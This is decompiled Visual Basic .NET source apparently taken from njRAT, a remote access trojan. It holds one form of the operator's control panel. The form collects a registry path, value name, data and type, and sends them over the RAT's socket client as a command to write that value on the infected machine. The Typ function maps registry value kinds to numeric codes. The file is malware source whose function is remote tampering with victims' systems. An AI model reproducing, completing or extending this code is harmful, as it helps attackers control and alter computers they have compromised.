Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32

Namespace NJRAT
	' Token: 0x02000024 RID: 36
	<DesignerGenerated()>
	Public Partial Class RGv
		Inherits Form

		' Token: 0x060002F5 RID: 757 RVA: 0x0001B33E File Offset: 0x0001953E
		Public Sub New()
			Me.InitializeComponent()
		End Sub

		' Token: 0x170000FB RID: 251
		' (get) Token: 0x060002F8 RID: 760 RVA: 0x0001B92C File Offset: 0x00019B2C
		' (set) Token: 0x060002F9 RID: 761 RVA: 0x0001B936 File Offset: 0x00019B36
		Friend Overridable Property Label1 As Label

		' Token: 0x170000FC RID: 252
		' (get) Token: 0x060002FA RID: 762 RVA: 0x0001B93F File Offset: 0x00019B3F
		' (set) Token: 0x060002FB RID: 763 RVA: 0x0001B949 File Offset: 0x00019B49
		Friend Overridable Property Label2 As Label

		' Token: 0x170000FD RID: 253
		' (get) Token: 0x060002FC RID: 764 RVA: 0x0001B952 File Offset: 0x00019B52
		' (set) Token: 0x060002FD RID: 765 RVA: 0x0001B95C File Offset: 0x00019B5C
		Friend Overridable Property Label3 As Label

		' Token: 0x170000FE RID: 254
		' (get) Token: 0x060002FE RID: 766 RVA: 0x0001B965 File Offset: 0x00019B65
		' (set) Token: 0x060002FF RID: 767 RVA: 0x0001B96F File Offset: 0x00019B6F
		Friend Overridable Property TextBox1 As TextBox

		' Token: 0x170000FF RID: 255
		' (get) Token: 0x06000300 RID: 768 RVA: 0x0001B978 File Offset: 0x00019B78
		' (set) Token: 0x06000301 RID: 769 RVA: 0x0001B982 File Offset: 0x00019B82
		Friend Overridable Property TextBox3 As TextBox

		' Token: 0x17000100 RID: 256
		' (get) Token: 0x06000302 RID: 770 RVA: 0x0001B98B File Offset: 0x00019B8B
		' (set) Token: 0x06000303 RID: 771 RVA: 0x0001B998 File Offset: 0x00019B98
		Friend Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000101 RID: 257
		' (get) Token: 0x06000304 RID: 772 RVA: 0x0001B9DB File Offset: 0x00019BDB
		' (set) Token: 0x06000305 RID: 773 RVA: 0x0001B9E5 File Offset: 0x00019BE5
		Friend Overridable Property ComboBox1 As ComboBox

		' Token: 0x06000306 RID: 774 RVA: 0x0001B9F0 File Offset: 0x00019BF0
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "!", Class7.string_1, Me.Path, Class7.string_1, Me.TextBox1.Text, Class7.string_1, Me.TextBox3.Text, Class7.string_1, Conversions.ToString(Me.Typ(Me.ComboBox1.Text)) }))
			MyBase.Close()
		End Sub

		' Token: 0x06000307 RID: 775 RVA: 0x0001BAA8 File Offset: 0x00019CA8
		Public Function Typ(t As String) As Integer
			Dim left As String = t.ToLower()
			Dim flag As Boolean = Operators.CompareString(left, RegistryValueKind.Binary.ToString().ToLower(), False) = 0
			Dim result As Integer
			If flag Then
				result = 3
			Else
				Dim flag2 As Boolean = Operators.CompareString(left, RegistryValueKind.DWord.ToString().ToLower(), False) = 0
				If flag2 Then
					result = 4
				Else
					Dim flag3 As Boolean = Operators.CompareString(left, RegistryValueKind.ExpandString.ToString().ToLower(), False) = 0
					If flag3 Then
						result = 2
					Else
						Dim flag4 As Boolean = Operators.CompareString(left, RegistryValueKind.MultiString.ToString().ToLower(), False) = 0
						If flag4 Then
							result = 7
						Else
							Dim flag5 As Boolean = Operators.CompareString(left, RegistryValueKind.QWord.ToString().ToLower(), False) = 0
							If flag5 Then
								result = 11
							Else
								Dim flag6 As Boolean = Operators.CompareString(left, RegistryValueKind.[String].ToString().ToLower(), False) = 0
								If flag6 Then
									result = 1
								Else
									Dim num As Integer
									result = num
								End If
							End If
						End If
					End If
				End If
			End If
			Return result
		End Function

		' Token: 0x040001AD RID: 429
		Public Path As String

		' Token: 0x040001AE RID: 430
		Public sk As Client
	End Class
End Namespace
